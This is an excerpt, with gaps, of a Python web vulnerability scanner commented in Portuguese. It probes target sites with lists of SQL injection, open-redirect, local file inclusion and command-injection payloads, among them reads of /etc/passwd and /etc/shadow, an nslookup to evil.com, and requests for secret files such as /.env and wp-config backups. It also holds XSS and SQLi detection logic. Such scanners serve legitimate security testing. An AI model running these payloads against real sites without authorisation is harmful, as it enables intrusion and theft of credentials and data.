...
Uso:
   python3 WebVuln Scanner Segurança Web.py
...
class WebVulnEngine:
    def __init__(self, domain, timeout=10, threads=10, aggressive=False,
        ...
        self.headers_issues = []
        self.seen_vulns = set()          # ← Deduplicação
        ...
        self.common_paths = [
            "/", "/admin", "/login", "/api", "/search", "/user", "/profile", "/contact",
            "/about", "/products", "/services", "/dashboard", "/api/v1", "/api/v2",
            "/wp-admin", "/phpmyadmin", "/administrator", "/backup", "/test", "/dev",
            "/staging", "/config", "/settings", "/upload", "/uploads", "/files",
            "/download", "/static", "/assets", "/.git/config", "/.env", "/robots.txt",
            "/sitemap.xml", "/.well-known", "/graphql", "/swagger", "/api-docs",
            "/debug", "/console", "/admin/", "/account", "/app", "/backup.sql",
            "/backup.tar.gz", "/backup.zip", "/blog", "/cgi-bin", "/config.bak",
            "/config.php", "/config.php.bak", "/cpanel", "/crossdomain.xml",
            "/database.sql", "/db.sql", "/images", "/includes", "/index.php",
            "/install", "/js", "/lib", "/license.txt", "/login.php", "/logout",
            "/media", "/node_modules", "/panel", "/phpinfo.php", "/plugins",
            "/private", "/readme.html", "/readme.txt", "/register", "/security.txt",
            "/server-status", "/shell", "/shell.php", "/swagger-ui", "/swagger.json",
            "/swagger.yaml", "/test.php", "/tmp", "/user/login", "/vendor",
            "/webmail", "/wp-content", "/wp-includes", "/wp-json", "/wp-login.php",
            "/wp-config.php", "/wp-config.php.bak", "/xmlrpc.php", "/.env.backup",
            "/.env.dev", "/.env.local", "/.env.production", "/.git", "/.git/HEAD",
            "/.gitignore", "/.htaccess", "/.htpasswd", "/composer.json",
        ...
        self.sqli_payloads = [
            ...
            "' UNION SELECT null,version()--", "' UNION ALL SELECT NULL--",
            "1' ORDER BY 1--", "1' ORDER BY 5--", "1' ORDER BY 10--", "1' ORDER BY 100--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
            "' OR SLEEP(5)--", "' OR SLEEP(5)#", "1' AND SLEEP(5)--",
        ...
        self.redirect_payloads = [
            ...
            '\\\\evil.com', '//google.com', '///google.com', '/\\evil.com',
            '////evil.com', 'https://evil.com/', 'https://evil.com/%2f..',
            'https://evil.com%2f%2e%2e', 'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>', '//evil.com/%2e%2e',
            'https://evil.com@google.com', 'https://google.com.evil.com',
            'https://evil.com\\@google.com', '/redirect?url=https://evil.com',
            '?next=https://evil.com', '?url=//evil.com', '?redirect=///evil.com',
        ...
        self.lfi_payloads = [
            ...
            '/etc/passwd', 'file:///etc/passwd', '....\/....\/....\/etc/passwd',
            '..%252F..%252F..%252Fetc%252Fpasswd', '..%c0%af..%c0%af..%c0%afetc/passwd',
            '/proc/self/environ', '/proc/version', '/etc/hosts', '/etc/shadow',
            '/var/log/apache2/access.log', '/var/log/nginx/access.log',
            '..\\..\\..\\windows\\win.ini', '..%5c..%5c..%5cwindows%5cwin.ini',
            'C:\\Windows\\win.ini', 'C:/Windows/win.ini', '..\\..\\..\\boot.ini',
            ...
            'php://input', 'zip://shell.jpg%23shell.php',
        ]

        self.cmd_payloads = [
            '; ls', '| ls', '`ls`', '$(ls)', '; whoami', '| whoami',
            '& whoami', '&& whoami', '|| whoami', ';id', '|id', '`id`', '$(id)',
            '; cat /etc/passwd', '| cat /etc/passwd', '; uname -a', '| uname -a',
            '; sleep 5', '| sleep 5', '`sleep 5`', '$(sleep 5)',
            '; ping -c 4 127.0.0.1', '| nslookup evil.com',
            '& dir', '| dir', '& whoami', '| whoami',
            '& type C:\\Windows\\win.ini', '| type C:\\Windows\\win.ini',
            '& ping -n 5 127.0.0.1', '| ping -n 5 127.0.0.1',
            '%0a whoami', '%0d%0a whoami', ';${IFS}whoami', '|${IFS}whoami',
    ...
    def add_vulnerability(self, vuln: dict) -> bool:
        """Adiciona vulnerabilidade evitando duplicatas."""
        key = (
            vuln['type'],
            vuln.get('parameter', ''),
            str(vuln.get('payload', ''))[:60]
        )
        with self.lock:
            if key not in self.seen_vulns:
                self.seen_vulns.add(key)
            ...
            for payload in self.xss_payloads:
                ...
                try:
                    ...
                    if payload in resp.text and 'text/html' in resp.headers.get('Content-Type', ''):
                        if any(x in payload.lower() for x in ['<script', 'onerror=', 'onload=', 'javascript:']):
                            severity = 'CRITICAL'
                            evidence = 'Payload with dangerous tags/events reflected'
                        elif any(x in payload for x in ['"', "'", '>', '<']):
                            severity = 'HIGH'
                            evidence = 'Payload reflected in potentially dangerous context'
                        else:
                            severity = 'MEDIUM'
                            evidence = 'Payload reflected (possible XSS)'
                        ...
                        if self.add_vulnerability(vuln):
                            self.log(f'[!] XSS ENCONTRADO ({severity}): {url} (param: {param})', 'vuln')
                        return
        ...
        for param in params:
            ...
            for payload in self.sqli_payloads:
                ...
                try:
                    ...
                    # Boolean-based (melhorado - menos falso positivo)
                    if '1=1' in payload or '1=2' in payload:
                        length_diff = abs(len(resp.content) - baseline_length)
                        if length_diff > 200:
                            opposite = payload.replace('1=1', '1=2') if '1=1' in payload else payload.replace('1=2', '1=1')
                            test_params_opp = params.copy()
                            test_params_opp[param] = [opposite]
                            test_url_opp = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params_opp, doseq=True)}"
                            try:
                                resp_opp = self.session.get(test_url_opp, timeout=self.timeout, verify=False)
                                length_diff_opp = abs(len(resp_opp.content) - baseline_length)
                                if abs(length_diff - length_diff_opp) > 100:
                                    vuln = {
                                        ...
                                        'parameter': param,
                                        'payload': payload,
                                        'evidence': f'Response length changed significantly ({length_diff} bytes) and confirmed'
                                    }
                                    if self.add_vulnerability(vuln):
    ...
    def generate_json_report(self, output_file: str):
        report = {
            'scan_metadata': {
                ...
                'scanner_version': '🦅 WebVuln Scanner',
